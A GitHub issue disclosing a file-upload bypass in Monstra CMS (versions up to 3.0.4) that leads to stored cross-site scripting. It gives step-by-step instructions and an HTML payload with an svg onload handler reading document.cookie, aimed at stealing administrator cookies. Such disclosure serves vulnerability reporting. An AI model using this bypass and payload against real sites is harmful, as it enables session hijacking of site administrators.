## Description

![@yaoyao6688](https://avatars.githubusercontent.com/u/32739336?v=4&size=48)[yaoyao6688](https://github.com/yaoyao6688)opened [on Oct 11, 2019](https://github.com/monstra-cms/monstra/issues/461#issue-505710156)

**Brief of this vulnerability**

There are many suffix names such as PHP and HTML in uploading files, but the following methods can bypass file restrictions, upload malicious HTML types and execute arbitrary JS code

**Test Environment**

php7.0.7+apache

**Affect version**

<=3.0.4

**Payload**

1 Visit website http://[address]:[port]/[app\_path]/admin/index.php?id=filesmanager with login

2 Save html codes with '.png' extensions. and upload it like below.

```
<html>
    <head>
	    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title>hacker</title>
    </head>
    <body>
     <svg/onload=alert(document.cookie)>
    </body>
</html>

```

3 Click the uploaded file name and Grab the packet and change the suffix name to `XXX"".html` at filename，This circumvents this limitation.

4 move to http://[address]:[port]/[app\_path]/public/uploads/[uploaded file]

You can see that you executed HTML and JS code，If you access this file, you can get the administrator's cookie and execute any JS code
